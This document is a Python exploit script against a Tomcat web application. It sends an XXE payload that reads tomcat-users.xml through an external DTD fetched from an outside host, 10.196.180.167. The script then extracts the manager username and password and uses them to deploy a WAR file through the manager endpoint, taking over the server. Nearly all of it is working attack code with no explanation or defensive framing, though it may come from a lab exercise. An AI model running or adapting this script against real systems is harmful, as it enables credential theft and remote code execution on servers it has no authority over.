import requests
import sys
import xml.etree.ElementTree as ET
import re

def main():
    if (len(sys.argv) != 3):
        print "Not enough input arguments.\nProvided: %s" %sys.argv[1:]
        print "USAGE:\nscript.py host port"
        exit (0)


    host = sys.argv[1]
    port = sys.argv[2]

    xml = """%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3C%21DOCTYPE+roottag+%5B%0D%0A+%3C%21ENTITY+%25+start+%22%3C%21%5BCDATA%5B%22%3E%0D%0A+%0D%0A%3C%21ENTITY+%25+goodies+SYSTEM+%22file%3A%2F%2F%2Fusr%2Flocal%2Ftomcat%2Fconf%2Ftomcat-users.xml%22%3E%0D%0A+%3C%21ENTITY+%25+end+%22%5D%5D%3E%22%3E%0D%0A+%0D%0A%3C%21ENTITY+%25+dtd+SYSTEM+%22http%3A%2F%2F10.196.180.167%2Fwebdav%2F%2Fpayload.xml%22%3E%0D%0A%25dtd%3B%0D%0A%5D%3E%0D%0A%0D%0A%3Ccustomer+age%3D%2230%22%3E%3Cflag%3Etrue%3C%2Fflag%3E%3Cname%3E%26all%3B%3C%2Fname%3E%3Caddress%3EThis+is+address%3C%2Faddress%3E%3C%2Fcustomer%3E"""

    headers={'Content-Type': 'text/xml'}
    try:
        url = "http://{0}:{1}/xml_app/result.html?xml={2}".format(host, port, xml)

        r = requests.get(url)

    except requests.exceptions.HTTPError as err:
        print err

    manager_username, manager_password = get_manager_creds(r.text)

    print "{}:{}".format(manager_username, manager_password)

    post_url = "http://{}:{}/manager/deploy".format(host, port)
    post_war(post_url, "xml_app_redir.war", manager_username, manager_password)

def get_manager_creds(xml):
    root = ET.fromstring(xml)

    for user in root.iter("user"):
        if "manager" in user.attrib['roles']:
            return user.attrib['username'], user.attrib['password']
    return 0

def post_war(url, war_file, username, password):
    files = {'file': open(war_file, 'rb')}
    payload = {'path': '/xml_app_redir'}
    try:
        req = requests.put(url, files=files, auth=(username, password), params=payload)
    except requests.exceptions.HTTPError as err:
        print err

    print req.status_code


if __name__ == "__main__":
    main()